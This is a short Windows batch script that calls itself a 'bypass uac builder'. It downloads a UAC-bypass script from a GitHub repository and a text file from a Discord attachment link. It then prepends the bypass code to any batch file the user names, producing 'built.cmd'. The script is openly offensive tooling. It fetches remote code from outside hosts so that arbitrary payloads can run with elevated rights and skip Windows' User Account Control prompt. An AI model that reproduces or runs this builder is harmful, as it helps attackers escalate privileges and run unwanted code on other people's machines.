@echo off
curl https://raw.githubusercontent.com/hai723/UAC_bypass/main/uac.cmd -o uac
curl https://cdn.discordapp.com/attachments/1195630998038261841/1196068718153830470/f618905dd125bbbf.txt? -o author.txt
cls
type author.txt
echo waring not support for bat is obf
SET/P "path=Enter File path : "
echo bypass uac builder...
type uac >built.cmd
type "%path%" >>built.cmd
start .
echo builder da xong
pause